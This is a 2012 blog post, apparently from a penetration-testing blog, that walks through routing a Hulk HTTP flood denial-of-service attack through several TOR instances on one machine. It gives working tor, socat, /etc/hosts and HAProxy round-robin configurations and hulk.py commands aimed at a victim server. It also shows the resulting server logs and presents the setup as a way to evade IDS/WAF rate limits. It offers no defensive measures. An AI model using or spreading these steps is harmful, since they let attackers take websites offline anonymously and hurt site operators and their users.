---
title: Routing DDoS HTTP attacks through TOR from a single machine
author: Jan Seidl
type: post
date: 2012-06-05T00:00:00+00:00
draft: true
url: /?p=208
categories:
  - Application Security
  - Penetration Testing
tags:
  - ddos
  - dos
  - haproxy
  - http
  - hulk
  - socat
  - tor

---
There are plenty of articles out there explaining how to [attack through <acronym title="The Onion Router">TOR</acronym>][1]. So, why am I writing it again? Because I&#8217;m emphatizing on tunneling <acronym title="HyperText Transfer Protocol">HTTP</acronym> <acronym title="Distributed Denial-of-Service">DDoS</acronym> attacks through <acronym title="The Onion Router">TOR</acronym>.

## Premises:

Victim Domain: example.com
  
Victim Webserver IP: 192.168.192.1
  
Attacker IP: 192.161.1.100
  
<acronym title="The Onion Router">TOR</acronym> Exit-Nodes IPs: 172.60.12.31, 172.60.12.32, 172.60.12.33, 172.60.12.34, 172.60.12.35

## Software Used

Hulk: <http://www.sectorix.com/2012/05/17/hulk-web-server-dos-tool/>
  
TOR: <https://www.torproject.org/>
  
socat: <http://www.dest-unreach.org/socat/>
  
HAProxy: <http://haproxy.1wt.eu/>

## <acronym title="HyperText Transfer Protocol">HTTP</acronym> <acronym title="Denial-of-Service">DoS</acronym> 101

<acronym title="HyperText Transfer Protocol">HTTP</acronym> <acronym title="Denial-of-Service">DoS</acronym> may come in many flavors. You can do a simple <acronym title="HyperText Transfer Protocol">HTTP</acronym> flood (making lots of connection requests), <acronym title="HyperText Transfer Protocol">HTTP</acronym> Slow Requests (RSnake&#8217;s [slowloris][2] vector), <acronym title="HyperText Transfer Protocol">HTTP</acronym> Slow Reads and such. In this article we&#8217;ll be dealing with the Hulk tool by Barry Shteiman that uses basically the <acronym title="HyperText Transfer Protocol">HTTP</acronym> flood vector with some randomizations to avoid filtering and &#8216;no-cache&#8217; directive to bypass proxy-cache servers like Squid and Varnish.

I&#8217;ll be talking more about <acronym title="HyperText Transfer Protocol">HTTP</acronym> <acronym title="Denial-of-Service">DoS</acronym> techniques and tools in a further article since this paper aims on describing the routing of these attacks through the <acronym title="The Onion Router">TOR</acronym> network.

Just to get things started I&#8217;ll do a very quick overview on how to open a single <acronym title="The Onion Router">TOR</acronym> tunnel.

## Basic <acronym title="The Onion Router">TOR</acronym> routing

Basic <acronym title="The Onion Router">TOR</acronym> routing involves a <acronym title="The Onion Router">TOR</acronym> instance and `socat` to be set up on the attacker system.

The basic premise is starting <acronym title="The Onion Router">TOR</acronym> normally

{{< highlight bash >}}
tor --RunAsDaemon 1 --CookieAuthentication 0 --HashedControlPassword "yourpasswordhashhere" --ControlPort 9999 --PidFile tor.pid --SocksPort 9050 --DataDirectory data/tor
{{< /highlight >}}

Then start the `socat` tunneling

{{< highlight bash >}}
sudo socat TCP4-LISTEN:80,fork SOCKS4A:localhost:192.168.192.1:80,socksport=9050
{{< /highlight >}}

The tunnel is now up and running. It will forward all traffic on local port 80 (:80) to remote port 80 (:80) through the <acronym title="The Onion Router">TOR</acronym> network under my local socket (localhost:9050)

## <acronym title="HyperText Transfer Protocol">HTTP</acronym> &#8216;Host&#8217; header gotcha

In most webserver environments, you can&#8217;t just reach the destination web page just by driving by its <acronym title="Internet Protocol">IP</acronym> address since multiple domains may be hosted under a single <acronym title="Internet Protocol">IP</acronym> address. This is called [Virtual-Host][3].

Thus, driving my attacks to http://localhost would mess up the attack since the <acronym title="HyperText Transfer Protocol">HTTP</acronym> <acronym title="Denial-of-Service">DoS</acronym> tool would use the address supplied as the `Host` header. As is very likely that the <acronym title="Internet Protocol">IP</acronym> address you are attacking does&#8217;nt have the &#8216;localhost&#8217; virtual-domain so you need to specify the true hostname on deploying the attack.

For that, `/etc/hosts` comes to the rescue. Just add to your hosts file:

{{< highlight text >}}
127.0.0.1 example.com www.example.com
{{< /highlight >}}

So you may now use your <acronym title="The Onion Router">TOR</acronym> tunnel freely

{{< highlight bash >}}
./hulk.py http://www.example.com -t 100
{{< /highlight >}}

And you get now your attacks with the exit-node <acronym title="Internet Protocol">IP</acronym>

{{< highlight apache >}}
172.60.12.31 - - [05/Jun/2012:09:41:26 -0700] "GET
/?i40V8Q=2a8x2kchiE1gY0j&kLMNAr=XYgOT&SXx8=Oet1MBpM4DSd1&mPa6Gw=BkKlJtvNwoDc
<acronym title="HyperText Transfer Protocol">HTTP</acronym>/1.1" 200 545 "http://www.google.com/?q=YyYfukIp2h" "Mozilla/4.0
{{< /highlight >}}

_Note:_ Without <acronym title="The Onion Router">TOR</acronym>, the attacks would hit the webserver with the attacker IP:

{{< highlight apache >}}
192.161.1.100 - - [05/Jun/2012:09:41:26 -0700] "GET
/?i40V8Q=2a8x2kchiE1gY0j&kLMNAr=XYgOT&SXx8=Oet1MBpM4DSd1&mPa6Gw=BkKlJtvNwoDc
<acronym title="HyperText Transfer Protocol">HTTP</acronym>/1.1" 200 545 "http://www.google.com/?q=YyYfukIp2h" "Mozilla/4.0
{{< /highlight >}}

## But you&#8217;ve said &#8220;Routing <acronym title="Distributed Denial-of-Service">DDoS</acronym> attacks&#8221;, this is only a <acronym title="Denial-of-Service">DoS</acronym> attack. Where is the &#8216;distributed&#8217; part?

I was half-asleep when I&#8217;ve got this on my mind: &#8220;What if we could open multiple <acronym title="The Onion Router">TOR</acronym> instances in a single machine? We would have multiple valid external ip addresses&#8221;. I wasn&#8217;t able to test it right away &#8217;cause my wife was already getting mad about my long-lived nights and then I decided to sleep and test it in the morning.

I&#8217;ve woke up next day almost late for a lunch that my &#8216;ol friends were organizing after a long time without seeing each other when I&#8217;ve got some emails from them telling that they wouldn&#8217;t be able to come and stuff.

Well, as I&#8217;m already awake, I decided to search for what I wondered before sleeping. I&#8217;ve quickly found on [this site][4] that my wonderings were right. I just needed a port to each instance, awesome! There I&#8217;ve found also a simple script to launch multiple <acronym title="The Onion Router">TOR</acronym> instances that I&#8217;ve quickly added to my toolkit.

I&#8217;ve started with only 5 instances to test my theory. So after I&#8217;ve got multiple <acronym title="The Onion Router">TOR</acronym> instances and opened a `socat` tunnel to each one:

{{< highlight bash >}}
sudo socat TCP4-LISTEN:8080,fork SOCKS4A:localhost:192.168.192.1:80,socksport=9050
sudo socat TCP4-LISTEN:8081,fork SOCKS4A:localhost:192.168.192.1:80,socksport=9051
sudo socat TCP4-LISTEN:8082,fork SOCKS4A:localhost:192.168.192.1:80,socksport=9052
sudo socat TCP4-LISTEN:8084,fork SOCKS4A:localhost:192.168.192.1:80,socksport=9053
sudo socat TCP4-LISTEN:8085,fork SOCKS4A:localhost:192.168.192.1:80,socksport=9054
{{< /highlight >}}

And then went to my browser and tested it:

{{< highlight text >}}
http://www.example.com:8080
{{< /highlight >}}

And BAM! hit the webserver through my 1st instance&#8217;s <acronym title="Internet Protocol">IP</acronym>.

I&#8217;ve followed throught the other ports (8080, 8081, 8082) and then each request appeared on the <acronym title="HyperText Transfer Protocol">HTTP</acronym> Server logs as a different source <acronym title="Internet Protocol">IP</acronym>.

Time to get the attack going.

## Tool limitations

Almost every <acronym title="HyperText Transfer Protocol">HTTP</acronym> <acronym title="Denial-of-Service">DoS</acronym> tool will get the attack <acronym title="Uniform Resource Locator">URL</acronym> supplied and use-it in their requests so I _THINK_ I could just opened a Hulk instance on each port like

{{< highlight bash >}}
./hulk.py http://www.example.com:8080 -t 100
./hulk.py http://www.example.com:8081 -t 100
./hulk.py http://www.example.com:8082 -t 100
# ... and so on
{{< /highlight >}}

But I&#8217;ve wanted to a single instance of Hulk to be able to attack through many <acronym title="Internet Protocol">IP</acronym> addresses. _Who you gonna call?_

## HAProxy to the rescue

I&#8217;ve been working with clustering (High-Availability and High-Performance) for years and I&#8217;m very familliar with load-balancing techniques like the so-obvious &#8220;round robin&#8221; so the idea came out: &#8220;What if I could put a load balancer on my local machine &#8220;round-robbing&#8221; through my `socat` ports?&#8221;

Well, that came out perfectly with a simple setup:

{{< highlight text >}}
listen torflood 0.0.0.0:80
   mode tcp
   balance roundrobin
   server  inst1 localhost:8080
   server  inst2 localhost:8081
   server  inst3 localhost:8082
{{< /highlight >}}

And then I&#8217;ve just let Hulk do its magic:

{{< highlight bash >}}
./hulk.py http://www.example.com -t 500
{{< /highlight >}}

Output:

{{< highlight text >}}
172.60.12.31 - - [05/Jun/2012:09:41:26 -0700] "GET
/?i40V8Q=2a8x2kchiE1gY0j&kLMNAr=XYgOT&SXx8=Oet1MBpM4DSd1&mPa6Gw=BkKlJtvNwoDc
<acronym title="HyperText Transfer Protocol">HTTP</acronym>/1.1" 200 545 "http://www.google.com/?q=YyYfukIp2h" "Mozilla/4.0
(compatible; <acronym title="Microsoft Internet Explorer">MSIE</acronym> 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
172.60.12.34 - - [05/Jun/2012:09:41:26 -0700] "GET
/?nrGb=LSj1&17vd5A=ylKN63uUe23 <acronym title="HyperText Transfer Protocol">HTTP</acronym>/1.1" 200 496
"http://www.google.com/?q=YIIk3kAX4F" "Mozilla/4.0 (compatible; <acronym title="Microsoft Internet Explorer">MSIE</acronym>
8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727;
InfoPath.2)"
172.60.12.32 - - [05/Jun/2012:09:41:26 -0700] "GET
/?WjNe7=o7HXGu1r4uUUWl4G <acronym title="HyperText Transfer Protocol">HTTP</acronym>/1.1" 200 545 "-" "Mozilla/5.0 (Windows;
U; <acronym title="Microsoft Internet Explorer">MSIE</acronym> 7.0; Windows NT 6.0; en-US)"
172.60.12.31 - - [05/Jun/2012:09:41:26 -0700] "POST
/?ymtLrqjeNo=cQc&xqVr5=Q3327gYR7EMdIfFcs&ovD=XeJIwFbrlWbkRS5sr&CgyFq=uVtw1eynVLdA8AVx
<acronym title="HyperText Transfer Protocol">HTTP</acronym>/1.1" 200 545 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US;
rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
172.60.12.33 - - [05/Jun/2012:09:41:26 -0700] "POST
/?oSNa2=OxbB&KpUqXoBN=ejf78lsx3T0rhG8Qw&mLlUu4rbS0=tbdGK8WpDcNuiEye5&pSc4loanYb=rCFyIATEYOPpbkQ&bRSxOpD=XYdW4vmRIOQS
...
{{< /highlight >}}

## Conclusion

So it seems doable to deploy and **Distributed Denial-of-Service** attack from a single machine! If you have enough exit nodes you will certainly bypass <acronym title="Intrusion Detection System">IDS</acronym>/<acronym title="Web Application Firewall">WAF</acronym> connection rate rules. How fun is that?

## Notes

  1. The Hulk version used in this test is a custom-modified version. I&#8217;m still working with the author (Barry Shteiman) to merge my mods
  2. All <acronym title="Internet Protocol">IP</acronym> addresses were spoofed for privacy of the victim, the attacker and the <acronym title="The Onion Router">TOR</acronym> exit nodes
  3. I have NOT tested the performance of these attacks through the <acronym title="The Onion Router">TOR</acronym> network but if you get some slow tunnels, just raise the number of tunnels until you get necessary throughput

 [1]: http://www.oreillynet.com/onlamp/blog/2005/07/launching_attacks_via_tor.html
 [2]: http://ha.ckers.org/slowloris/
 [3]: http://en.wikipedia.org/wiki/Virtual_hosting
 [4]: http://blog.databigbang.com/distributed-scraping-with-multiple-tor-circuits/
